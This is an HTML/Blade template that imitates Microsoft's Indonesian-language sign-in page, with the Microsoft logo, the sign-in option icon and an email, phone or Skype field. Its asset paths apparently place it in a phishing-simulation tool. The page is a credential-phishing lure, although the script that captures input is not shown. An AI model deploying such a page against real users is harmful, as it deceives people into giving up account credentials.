<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Masuk ke akun Microsoft Anda</title>

    <!-- CSS style and font-->
    <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">

    <!-- Alpine JS -->
    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    @vite('resources/css/app.css')
    @vite('resources/css/sim-template/microsoft/user.css')
    @vite('resources/js/sim-template/microsoft/user.js')
  </head>
  <body>
    <div class="formcontainer">
      <div class="container">
        <img
          src="https://blogs.microsoft.com/wp-content/uploads/prod/2012/08/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen.jpg"
          alt="Microsoft Logo"
          class="logo"
        />

        <h1>Masuk</h1>
        <div id="error-message" class="error-message" style="display: none">
          Harap masukkan alamat yang valid dan tidak kosong.
        </div>
        <input
          type="text"
          id="userInput"
          class="input-field"
          placeholder="Alamat email, nomor telepon, atau Skype"
          required
        />
        <a href="#">Tidak dapat mengakses akun Anda?</a>

        <div class="button-container" id="button-container">
          <button class="btn-secondary" type="button">Kembali</button>
          <button class="btn-primary" type="button">
            Selanjutnya
          </button>
        </div>
      </div>

      <a href="#" class="key-container">
        <img
          src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
          alt="Key Icon"
        />
        <p class="footer-text">Opsi masuk</p>
      </a>
    </div>

    <div class="footer-right">
      <p>
        <a href="#">Ketentuan penggunaan</a> <a href="#">Privasi & cookie</a>
      </p>
    </div>
  </body>
</html>
